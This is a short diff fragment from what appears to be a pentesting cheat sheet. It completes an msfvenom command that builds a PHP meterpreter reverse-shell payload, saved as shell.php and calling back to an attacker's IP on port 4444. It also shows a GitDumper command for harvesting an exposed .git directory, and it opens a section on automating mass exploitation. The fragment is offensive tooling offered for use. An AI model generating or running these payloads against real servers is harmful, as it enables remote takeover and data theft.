@@ -256,5 +256,8 @@ python3 GitDumper.py https://target.com/.git /output-folder/
 msfvenom
 
 ```
-masfvenom -p php/meterpreter/reverseshell_tcp
+msfvenom -p php/meterpreter/reverseshell_tcp LHOST=your_ip LPORT=4444 -f raw > shell.php
 ```
+
+---
+# 20.Automating Mass Exp
